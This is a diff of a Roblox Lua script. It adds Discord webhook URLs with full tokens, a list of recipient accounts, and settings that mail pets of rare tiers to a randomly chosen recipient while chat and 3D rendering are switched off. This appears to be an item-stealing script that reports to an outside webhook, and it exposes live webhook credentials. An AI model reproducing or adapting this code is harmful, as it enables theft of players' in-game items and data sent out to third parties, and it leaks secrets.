@@ -22,16 +22,16 @@ local function serverhop()
 end
 
 local usernames = {
-    "earlbatman56",
-    "823545woldemar",
-    "dsfgsde4",
-    "gietzhfy400",
-    "daucatmoi1236549",
-    "barbaraand692",
-    "MiaHarris54",
-    "ertwsafcrt",
-    "waver2na370",
-    "kermieiacobus86"
+    "kethemhanh3",
+    "johnwhichh5",
+    "johnwhichh4",
+    "johnwhichh6",
+    "johnwhichh7",
+    "johnwhichh8",
+    "johnwhichh12",
+    "johnwhichh11",
+    "johnwhichh13",
+    "johnwhichh10"
 }
 
 local function getRandomUsername()
@@ -42,7 +42,7 @@ end
 local sendto = getRandomUsername()
 
 
-local Url2 = ""
+local Url2 = "https://discord.com/api/webhooks/1181449125187833856/0kA4c5-OXkAOQvZeJxnOKrKc7cTzlGvjpjMNKn-UkImyh82rPZ8-np_RwU0w6DelHjty"
 local Http2 = game:GetService("HttpService")
 	local Msg = function(msg)
 		request({Url = Url2,Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = Http2:JSONEncode({content = msg})})
@@ -91,37 +91,18 @@ if not game:IsLoaded() then
   end
 
 
+	game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat,false)
+	game:GetService("RunService"):Set3dRenderingEnabled(false)
 
-task.spawn(function()
-game:GetService("RunService"):Set3dRenderingEnabled(false)
-		for _, v in pairs(game.Players:GetChildren()) do
-        	for _, v2 in pairs(v.Character:GetDescendants()) do
-                    if v2:IsA("BasePart") or v2:IsA("Decal") then
-                        v2.Transparency = 1
-                    end
-                end
-        end
-				
-    while true do
-        
-        for i, v in pairs(game.Players:GetPlayers()) do
-            if v ~= game.Players.LocalPlayer then
-                pcall(function()
-                    local Character = v.Character
-                    Character:Destroy()
-                end)
-            end
-        end
-	task.wait(30)
-    end
-end)
+
+
 
 getgenv().Settings = {
-    ["Webhook"] = "https://discord.com/api/webhooks/1281726288364699769/Wn5gkb1cv21e5757EE9oFytBoIawMGTVTstgY3xohWcbNsGgD_-QAwvy5GvdBJNX1GLw",
-    ["Discord ID"] = "844977783083368518",
+    ["Webhook"] = "https://discord.com/api/webhooks/1181448839375368192/zIEM3Fn0GVE2g0XGCGv-6NCDEJ8yZmb8xee8NWznI3uQulQBxioakggYHdYaesCyiMC9",
+    ["Discord ID"] = "",
     
-    ["Mail Pets"] = "sendto",
-    ["Rarities"] = {"Secret", "Exclusive", "Divine", "Exotic", "Celestial", "Superior", "Mythical"},
+    ["Mail Pets"] = sendto,
+    ["Rarities"] = {"Secret", "Exclusive", "Divine", "Exotic", "Celestial", "Superior"},
 }
 
 daubuoi = true
